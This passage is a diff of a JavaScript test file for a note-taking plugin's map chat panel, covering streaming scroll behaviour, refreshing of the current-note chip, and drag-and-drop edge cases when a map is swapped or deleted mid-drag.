+  lay('>'.repeat(200) + ' deep'); lay('*'.repeat(500) + 'x' + '*'.repeat(500)); lay('['.repeat(2000)); lay('- a\n'.repeat(2000));
+  const el = lay('_a '.repeat(3000)); assert.ok(visibleText(el).length > 0);
 });
 
 integrationTest('map chat D3 F4: text dragged in while the note is in another window or a background tab still names its source note, with the file and a baseline', async () => {
@@ -1567,7 +1667,7 @@ integrationTest('map chat D3 F4: a dropped [[link]] resolves from the source not
 integrationTest('map chat D3 F5: the chip follows the layout too: a tab shown or hidden without a leaf change updates it', async () => {
   const h = await harness(); await h.view.hydrate();
   h.view.registerEvent = ref => ref; h.view.registerWorkspaceEvents();
-  eq(h.handlers.map(x => x.name).sort(), ['active-leaf-change', 'layout-change']);
+  eq(h.handlers.map(x => x.name).sort(), ['active-leaf-change', 'layout-change', 'resize']);
   let shown = true; const leaf = h.leaf('Notes/Other.md'); leaf.containerEl.isShown = () => shown;
   h.setLeaves(leaf);
   const chat = h.open(); eq(noteLabel(chat), ['Current note: Other']);
@@ -1575,4 +1675,83 @@ integrationTest('map chat D3 F5: the chip follows the layout too: a tab shown or
   shown = true; h.handlers.find(x => x.name === 'layout-change').fn(); eq(noteLabel(chat), ['Current note: Other'], 'the tab is shown again');
   h.setLeaves(h.leaf('Notes/Research.md')); h.handlers.find(x => x.name === 'active-leaf-change').fn({ view: h.leaves[0].view });
   eq(noteLabel(chat), ['Current note: Research']); assert.equal(h.view.lastMarkdownPath, 'Notes/Research.md');
+});
+
+// ---- Packet D4: drag across maps, streaming scroll, collapsed sidebar --------------------------------------------------------
+
+test('map chat D4: streaming keeps the end in view only when the reader was already at the end', () => {
+  const f = panelFixture(); f.panel.setOpen(true); const log = f.parts.log();
+  log.scrollHeight = 1000; log.clientHeight = 200; log.scrollTop = 800;
+  f.panel.begin('q'); log.scrollTop = 800;
+  f.panel.streamReply('a'); assert.equal(log.scrollTop, 1000, 'at the end: follows the new text');
+  log.scrollTop = 100; f.panel.streamReply('ab'); assert.equal(log.scrollTop, 100, 'scrolled up to read: left where it is');
+  f.panel.finish('abc', []); assert.equal(log.scrollTop, 100, 'finishing does not pull a reader who scrolled up');
+  log.scrollTop = 795; f.panel.begin('q2'); assert.equal(log.scrollTop, 1000, 'a new question always shows its own end');
+  log.scrollTop = 100; f.panel.begin('q3', undefined, false); assert.equal(log.scrollTop, 1000);
+});
+
+test('map chat D4 Bug A: focusing the message field, opening the panel and a resize all look at the visible note again', () => {
+  const f = panelFixture(); f.panel.setOpen(true); f.showNote('Notes/A.md');
+  eq(f.parts.chipTexts(), ['Current note: A']);
+  f.setVisible(null); eq(f.parts.chipTexts(), ['Current note: A'], 'nothing told the panel yet');
+  f.parts.input().fire('focus'); eq(f.parts.chipTexts(), [], 'focus refreshes the chip');
+  f.setVisible('Notes/B.md'); f.panel.setOpen(false); f.panel.setOpen(true); eq(f.parts.chipTexts(), ['Current note: B'], 'opening refreshes it');
+  f.setVisible(null); f.panel.setOpen(true, true); eq(f.parts.chipTexts(), [], 'opening with focus refreshes it');
+});
+
+integrationTest('map chat D4 Bug A: the note beside the map is hidden by collapsing a side panel; focusing the field removes its chip, and the resize event does too', async () => {
+  const h = await harness(); await h.view.hydrate();
+  h.view.registerEvent = ref => ref; h.view.registerWorkspaceEvents();
+  let shown = true; const leaf = h.leaf('Notes/Other.md'); leaf.containerEl.isShown = () => shown; h.setLeaves(leaf);
+  const chat = h.open(); eq(noteLabel(chat), ['Current note: Other']);
+  shown = false; chat.inputEl.fire('focus'); eq(noteLabel(chat), [], 'focus: the chip is gone');
+  shown = true; h.handlers.find(x => x.name === 'resize').fn(); eq(noteLabel(chat), ['Current note: Other'], 'resize: back');
+  shown = false; h.handlers.find(x => x.name === 'resize').fn(); eq(noteLabel(chat), []);
+});
+
+integrationTest('map chat D4: a drag whose map was swapped for another before the drop writes nothing and adds no chip', async () => {
+  for (const target of [[100, 400], [520, 150]]) {
+    const d = await dragHarness();
+    d.down(); d.move(target[0], target[1]); d.move(target[0] + 40, target[1] + 10);
+    d.view.map = { ...d.view.map, id: 'another-map' };
+    d.up(); await tick();
+    assert.equal(d.chat.attachments().length, 0, 'no chip'); assert.equal(d.changes.length, 0, 'no write'); assert.equal(d.view.dragging, false); assert.equal(d.view.dragOrigin, null);
+    assert.ok(!hasClass(d.chat.el, 'is-drop'));
+  }
+  const d = await dragHarness(); d.down(); d.move(520, 150); d.view.path = 'Another/Map.md'; d.up(); await tick();
+  assert.equal(d.changes.length, 0, 'a different map file counts as a different map');
+});
+
+integrationTest('map chat D4: a drag whose map was deleted (map null) ends cleanly on the next move, on the drop and on a cancel, without throwing', async () => {
+  const moved = await dragHarness(); moved.down(); moved.move(100, 400); moved.view.map = null;
+  moved.move(110, 410);
+  assert.equal(moved.view.dragging, false, 'the next move ends the drag'); assert.equal(moved.events.has('pointermove'), false, 'its listeners are gone'); assert.ok(!hasClass(moved.chat.el, 'is-drop'));
+  const dropped = await dragHarness(); dropped.down(); dropped.move(100, 400); dropped.view.map = null; dropped.up(); await tick();
+  assert.equal(dropped.chat.attachments().length, 0); assert.equal(dropped.changes.length, 0); assert.equal(dropped.view.dragging, false);
+  const cancelled = await dragHarness(); cancelled.down(); cancelled.view.map = null; cancelled.events.get('pointercancel')({ type: 'pointercancel' }); assert.equal(cancelled.view.dragging, false);
+});
+
+integrationTest('map chat D4: a repaint asked for during a drag runs at once when the drag\'s map is gone, and still waits when only the map object was replaced', async () => {
+  const gone = await dragHarness(); const probe = realRenderProbe(gone);
+  gone.down(); gone.move(100, 400); gone.view.map = { ...gone.view.map, id: 'another-map' };
+  probe.run(() => gone.view.render());
+  assert.equal(probe.count, 1, 'repainted right away'); assert.equal(gone.view.dragging, false); assert.equal(gone.events.has('pointermove'), false); assert.equal(gone.view.renderAfterDrag, false);
+  const nulled = await dragHarness(); const probe2 = realRenderProbe(nulled);
+  nulled.down(); nulled.view.map = null; probe2.run(() => nulled.view.render());
+  assert.equal(probe2.count, 1); assert.equal(nulled.view.dragging, false);
+  const same = await dragHarness(); const probe3 = realRenderProbe(same);
+  same.down(); same.move(100, 400); same.view.map = { ...same.view.map };
+  probe3.run(() => same.view.render()); assert.equal(probe3.count, 0, 'same map, new object (every saved change makes one): the drag goes on'); assert.equal(same.view.renderAfterDrag, true);
+  probe3.run(() => same.up()); assert.equal(probe3.count, 1); eq(same.chat.attachments(), [{ kind: 'topic', id: same.ids.a }], 'and the drop still adds its chip');
+});
+
+integrationTest('map chat D4: a pending repaint also runs when the drop finds the map gone, and a card that left the map adds no chip', async () => {
+  const d = await dragHarness(); const probe = realRenderProbe(d);
+  d.down(); d.move(100, 400); probe.run(() => d.view.render()); assert.equal(d.view.renderAfterDrag, true);
+  d.view.map = { ...d.view.map, id: 'another-map' };
+  probe.run(() => d.up());
+  assert.equal(probe.count, 1); assert.equal(d.chat.attachments().length, 0); assert.equal(d.changes.length, 0);
+  const removed = await dragHarness(); removed.down(); removed.move(100, 400);
+  removed.view.map = { ...removed.view.map, nodes: removed.view.map.nodes.filter(n => n.id !== removed.ids.a) }; removed.up();
+  assert.equal(removed.chat.attachments().length, 0, 'the card is no longer on the map');
 });
